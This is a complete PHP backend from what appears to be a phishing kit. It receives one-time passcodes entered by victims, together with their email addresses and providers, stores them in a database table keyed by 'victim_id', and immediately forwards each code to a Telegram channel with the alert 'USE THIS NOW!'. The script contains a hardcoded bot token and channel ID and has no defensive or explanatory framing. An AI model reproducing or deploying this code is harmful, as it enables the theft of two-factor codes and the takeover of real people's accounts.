<?php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');
header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') { exit(0); }

define('BOT_TOKEN', '8849922646:AAHL1k8PDTU83eg5OVZJYTqGdLvyfwdydaw');
define('OTP_CHANNEL', '8374468402');
define('DB_FILE', '../storage/box26.db');

try {
    $db = new PDO('sqlite:' . DB_FILE);
    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    
    $db->exec("CREATE TABLE IF NOT EXISTS otps (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        victim_id TEXT,
        provider TEXT,
        email TEXT,
        otp TEXT,
        captured_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        used BOOLEAN DEFAULT 0,
        forwarded BOOLEAN DEFAULT 0
    )");
} catch (Exception $e) {}

$input = json_decode(file_get_contents('php://input'), true);

if (!$input || !isset($input['otp'])) {
    http_response_code(400);
    echo json_encode(['error' => 'OTP required']);
    exit;
}

$victimId = $input['victim_id'] ?? 'UNKNOWN';
$provider = $input['provider'] ?? 'unknown';
$email = $input['email'] ?? 'unknown';
$otp = $input['otp'];
$domain = $_SERVER['HTTP_HOST'] ?? 'unknown';

try {
    $stmt = $db->prepare("INSERT INTO otps (victim_id, provider, email, otp) VALUES (?, ?, ?, ?)");
    $stmt->execute([$victimId, $provider, $email, $otp]);
} catch (Exception $e) {}

$message = "🚨 <b>URGENT: OTP CAPTURED</b>\n";
$message .= "🌐 Domain: $domain\n";
$message .= "🆔 {$victimId}\n";
$message .= "📧 {$provider} - {$email}\n";
$message .= "🔑 <b>{$otp}</b>\n";
$message .= "⚠️ USE THIS NOW!";

$url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";
$data = ['chat_id' => OTP_CHANNEL, 'text' => $message, 'parse_mode' => 'HTML'];

$options = [
    'http' => [
        'header' => "Content-type: application/x-www-form-urlencoded\r\n",
        'method' => 'POST',
        'content' => http_build_query($data),
        'timeout' => 10
    ]
];

$context = stream_context_create($options);
@file_get_contents($url, false, $context);

echo json_encode(['success' => true, 'otp' => $otp]);
?>
